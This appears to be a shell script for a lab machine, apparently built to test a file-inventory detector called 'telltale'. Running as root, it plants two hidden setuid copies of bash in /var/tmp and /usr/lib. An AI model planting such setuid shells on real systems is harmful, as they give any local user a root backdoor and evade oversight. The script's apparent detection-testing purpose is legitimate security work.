#!/bin/sh
# A setuid copy of bash in /var/tmp, and one in /usr/lib where telltale looks.
# Runs as root inside a lab machine. Stand-ins are expected in /lab/standins.
set -eu
SI=/lab/standins
need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
cp /bin/bash /var/tmp/.s
chmod 4755 /var/tmp/.s
# telltale's file inventory covers /usr but not /var/tmp, so a second copy sits where it looks.
cp /bin/bash /usr/lib/.s
chmod 4755 /usr/lib/.s
